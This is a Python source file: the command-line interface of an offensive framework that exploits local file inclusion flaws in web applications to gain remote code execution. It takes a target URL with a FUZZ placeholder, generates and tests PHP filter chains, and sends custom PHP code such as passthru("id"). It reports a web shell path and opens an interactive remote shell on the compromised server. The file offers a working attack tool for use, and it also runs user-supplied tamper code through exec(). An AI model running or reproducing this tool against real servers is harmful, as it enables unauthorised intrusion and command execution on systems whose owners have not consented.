#!/usr/bin/env python3
"""
Command-line interface for Elle-Est-Fit LFI to RCE Framework.
"""

import argparse
import sys
import logging
import importlib
import traceback
from typing import Callable, Optional
import textwrap

from rich.console import Console
from rich.logging import RichHandler
from rich.theme import Theme
from rich.panel import Panel

from . import __version__
from .core import LFI, info
from .exceptions import ElleEstFitError

# Create a custom theme for Rich
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "shell": "green",
    "command": "bold blue",
    "output": "bright_white",
})

# Create a console with the custom theme
console = Console(theme=custom_theme)

# Configure logger
logger = logging.getLogger("elle-est-fit")


def setup_logging(verbose: bool = False):
    """Configure logging based on verbosity level."""
    # Set up Rich logging
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Configure root logger with Rich handler
    logging.basicConfig(
        level=log_level,  # This sets the threshold for which messages will be logged
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True, console=console, show_time=False)]
    )
    
    # Ensure the elle-est-fit logger uses the right level
    logger = logging.getLogger("elle-est-fit")
    logger.setLevel(log_level)
    
    # Also set debug level for any technique module loggers
    techniques_logger = logging.getLogger("elle_est_fit.techniques")
    techniques_logger.setLevel(log_level)
    
    # Print a message to verify logging is working
    if verbose:
        console.print("[info]Verbose logging enabled[/info]")
        logger.debug("Debug logging is active")


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Elle-Est-Fit: LFI to RCE Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Examples:
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique php_filters
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --double-url-encode --custom-cmd 'id'
          elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique nginx_temp_files --php 'passthru("id");'
          elle-est-fit --dump-chain '<?php phpinfo(); ?>'
        """)
    )
    
    parser.add_argument('--version', action='version', version=f'Elle-Est-Fit v{__version__}')
    
    # Target options
    target_group = parser.add_argument_group('Target')
    target_group.add_argument('--url', help='Target URL with LFI vulnerability (use FUZZ as the placeholder for the LFI path)')
    
    # Technique options
    technique_group = parser.add_argument_group('Technique')
    technique_group.add_argument('--technique', help='Specific technique to use (default: auto-detect)')
    technique_group.add_argument('--list-techniques', action='store_true', help='List available techniques')
    technique_group.add_argument('--dump-chain', help='Generate and dump a PHP filter chain for the given PHP code')
    technique_group.add_argument('--test-chain', help='Test a specific PHP filter chain against the target URL')
    
    # Encoding options
    encoding_group = parser.add_argument_group('Encoding')
    encoding_group.add_argument('--double-url-encode', action='store_true', help='Apply double URL encoding')
    encoding_group.add_argument('--tamper', help='Python code for custom tampering function')
    
    # Payload options
    payload_group = parser.add_argument_group('Payload')
    payload_group.add_argument('--php', help='Custom PHP code to execute')
    payload_group.add_argument('--custom-cmd', help='Custom command to execute')
    
    # Output options
    output_group = parser.add_argument_group('Output')
    output_group.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    output_group.add_argument('-q', '--quiet', action='store_true', help='Suppress non-essential output')
    output_group.add_argument('--interactive', action='store_true', help='Start an interactive shell after exploitation')
    
    return parser.parse_args()


def list_available_techniques():
    """List all available techniques with their descriptions."""
    import pkgutil
    import inspect
    import importlib
    from .techniques.base import TechniqueBase
    
    console.print("Available techniques:", style="info")
    console.print("---------------------", style="info")
    
    # Find all modules in the techniques package
    techniques_path = 'elle_est_fit.techniques'
    for _, name, _ in pkgutil.iter_modules([techniques_path.replace('.', '/')]):
        if name == 'base':
            continue
            
        try:
            # Import the module
            module = importlib.import_module(f"{techniques_path}.{name}")
            
            # Find the technique class in the module
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if (inspect.isclass(attr) and
                    issubclass(attr, TechniqueBase) and
                    attr != TechniqueBase):
                    
                    # Print the technique info
                    console.print(f"  [success]{attr.name}[/success]: {attr.description}")
        except (ImportError, AttributeError) as e:
            console.print(f"  Error loading {name}: {str(e)}", style="error")
    
    console.print("\nUsage: --technique <technique_name>", style="info")


def parse_tamper_function(code_str: str) -> Optional[Callable[[str], str]]:
    """
    Parse and compile a tamper function from a string.
    
    Args:
        code_str: Python code string defining a tamper function
        
    Returns:
        Compiled function or None if parsing fails
    """
    if not code_str:
        return None
        
    try:
        # Create a namespace for the function
        namespace = {}
        
        # If the code doesn't define a function, wrap it in one
        if not code_str.strip().startswith('def tamper'):
            code_str = f"def tamper(payload):\n    {code_str}"
        
        # Compile and execute the code
        exec(code_str, namespace)
        
        # Return the tamper function
        return namespace.get('tamper')
    except Exception as e:
        logger.error(f"Error parsing tamper function: {str(e)}")
        return None


def interactive_shell(lfi_instance):
    """
    Start an interactive shell for command execution.
    
    Args:
        lfi_instance: Initialized and exploited LFI instance
    """
    console.print("\nStarting interactive shell. Type 'exit' or 'quit' to exit.", style="info")
    console.print("------------------------------------------------------", style="info")
    
    while True:
        try:
            # Get the command from the user
            cmd = console.input("[shell]shell>[/shell] ")
            
            # Check if the user wants to exit
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
                
            # Execute the command
            if cmd.strip():
                try:
                    output = lfi_instance.shell(cmd)
                    console.print(output, style="output")
                except AttributeError as e:
                    console.print(f"Error: {str(e)}", style="error")
                    console.print("The shell method is missing from the LFI class. Please check the core.py file.", style="error")
                    break
        except KeyboardInterrupt:
            console.print("\nExiting interactive shell...", style="warning")
            break
        except Exception as e:
            console.print(f"Error: {str(e)}", style="error")


def test_chain(url, chain, verbose=False):
    """
    Test a PHP filter chain against a target URL.
    
    Args:
        url: Target URL with {} placeholder
        chain: PHP filter chain to test
        verbose: Whether to show verbose output
    """
    import requests
    
    complete_url = url.format(chain)
    console.print(f"Testing URL: {complete_url}", style="info")
    
    try:
        response = requests.get(complete_url, timeout=10)
        console.print(f"Response status code: {response.status_code}", 
                     style="success" if response.status_code == 200 else "warning")
        
        if response.status_code == 200:
            console.print("\nResponse content:", style="info")
            console.print(Panel(response.text[:1000], title="Response Preview", border_style="cyan"))
            
            # Try to detect common success markers
            detection_markers = ["ELLEESTFIT", "phpinfo", "uid=", "system"]
            for marker in detection_markers:
                if marker in response.text:
                    console.print(f"\n[success]Success marker found:[/success] '{marker}' at position {response.text.find(marker)}")
        else:
            console.print(f"Request failed with status code: {response.status_code}", style="error")
    except Exception as e:
        console.print(f"Error making request: {str(e)}", style="error")

def debug(message: str):
    """Display debug information when in verbose mode."""
    logger.debug(message)

def main():
    """Main entry point for the CLI."""
    args = parse_args()
    
    # Configure logging
    setup_logging(args.verbose)
    
    # Process special commands that don't require a URL
    
    # List available techniques and exit
    if args.list_techniques:
        list_available_techniques()
        return 0
    
    # Handle the dump-chain command
    if args.dump_chain:
        try:
            from .payloads.filter_chain import generate_filter_chain
            php_code = args.dump_chain
            console.print(f"\nGenerating PHP filter chain for: ", end="")
            console.print(php_code, style="command")
            chain = generate_filter_chain(php_code)
            console.print("\nPHP Filter Chain:", style="info")
            console.print(Panel(chain[:200] + "..." if len(chain) > 200 else chain, 
                               title="Filter Chain", border_style="cyan"))
            console.print("\nUse this chain with your LFI vulnerability", style="info")
            return 0
        except Exception as e:
            console.print(f"Error generating filter chain: {str(e)}", style="error")
            if args.verbose:
                console.print_exception()
            return 1
    
    # Handle test-chain
    if args.test_chain and args.url:
        url = args.url.replace('FUZZ', '{}')
        test_chain(url, args.test_chain, args.verbose)
        return 0
    
    # Check if URL is required but not provided
    if not args.url:
        console.print("Error: --url is required unless --list-techniques or --dump-chain is specified", style="error")
        return 1
    
    try:
        console.print(f"[info]Targeting:[/info] {args.url}")
        
        # Parse the tamper function if provided
        tamper_func = parse_tamper_function(args.tamper) if args.tamper else None
        
        # Normalize URL to replace FUZZ with an empty placeholder
        url = args.url.replace('FUZZ', '{}')
        
        console.print("[info]Creating LFI instance...[/info]")
        # Create the LFI instance
        lfi = LFI(
            target=url,
            technique=args.technique,
            double_url_encode=args.double_url_encode,
            tamper=tamper_func,
            php_code=args.php,
            custom_cmd=args.custom_cmd,
            verbose=args.verbose
        )
        
        if args.verbose:
            technique_str = f"'{args.technique}'" if args.technique else "auto-detect"
            debug(f"Technique: {technique_str}")
            console.print(f"[info]Double URL encode:[/info] {args.double_url_encode}")
        if args.php:
            console.print(f"[info]Custom PHP code:[/info] {args.php}")

        console.print("[warning]Note: If you experience HTTP 414 errors (URI Too Long), try shorter payloads[/warning]")
        console.print("[info]Attempting exploitation...[/info]")
        # Attempt to exploit
        if lfi.exploit():

            console.print(f"[success]Exploitation successful![/success] Shell created at {lfi.target.replace('{}','')+lfi.shell_path}&cmd=id", style="success")
            # Execute the custom command if provided
            if args.custom_cmd:
                console.print(f"\n[info]Executing command:[/info] [command]{args.custom_cmd}[/command]")
                output = lfi.shell()
                console.print("\nCommand output:", style="info")
                console.print(Panel(output, title="Command Output", border_style="green"))
            
            # Start interactive shell if requested
            if args.interactive:
                interactive_shell(lfi)
            
            return 0
        else:
            console.print("[error]Exploitation failed.[/error]")
            return 1
            
    except ElleEstFitError as e:
        logger.error(str(e))
        console.print(f"Error: {str(e)}", style="error")
        if args.verbose:
            console.print_exception()
        return 1
    except KeyboardInterrupt:
        logger.info("Operation interrupted by user.")
        console.print("\nOperation interrupted by user.", style="warning")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        console.print(f"Unexpected error: {str(e)}", style="error")
        if args.verbose:
            console.print_exception()
        return 1


if __name__ == "__main__":
    sys.exit(main())